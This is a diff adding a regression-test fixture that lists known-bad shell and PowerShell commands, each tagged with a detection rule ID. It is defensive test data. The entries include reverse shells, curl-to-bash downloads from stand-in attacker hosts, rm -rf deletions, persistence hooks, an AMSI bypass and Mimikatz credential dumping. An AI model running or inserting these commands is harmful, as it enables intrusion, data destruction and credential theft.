@@ -1,0 +1,50 @@
+# Known-bad commands used in regression tests.
+# Format: one command per line. Lines starting with # are comments.
+
+# BASE001 — curl pipe to bash
+curl https://example.com/setup.sh | bash
+
+# BASE001 — wget pipe to sh
+wget -O - https://malicious.site/payload.sh | sh
+
+# BASE004 — recursive delete home
+rm -rf ~/
+
+# BASE004 — recursive delete root
+rm -rf /
+
+# BASE006 — bash reverse shell
+bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
+
+# BASE007 — crontab modification
+(crontab -l; echo "@reboot curl http://evil.com/c2.sh | bash") | crontab -
+
+# PS001 — encoded powershell
+powershell -EncodedCommand JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0
+
+# PS002 — IEX with download
+IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')
+
+# PS003 — AMSI bypass
+[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
+
+# PS004 — execution policy bypass
+powershell -ExecutionPolicy Bypass -File script.ps1
+
+# PS006 — mimikatz
+Invoke-Mimikatz -DumpCreds
+
+# UNIX001 — SSH key injection
+echo "ssh-rsa AAAAB3Nza... attacker@evil.com" >> ~/.ssh/authorized_keys
+
+# UNIX006 — bashrc persistence
+echo "curl http://c2.evil.com/beacon | bash" >> ~/.bashrc
+
+# OBF001 — base64 blob
+powershell JABjAGwAaQBlAG4AdAAgAD0AIAB...AAAAAAAAAAAAAAAAAAAAAA==
+
+# OBF002 — char concat
+$cmd = [char]115+[char]104; IEX $cmd
+
+# BASE008 — raw IP download
+curl http://192.168.1.100/malware.sh | bash
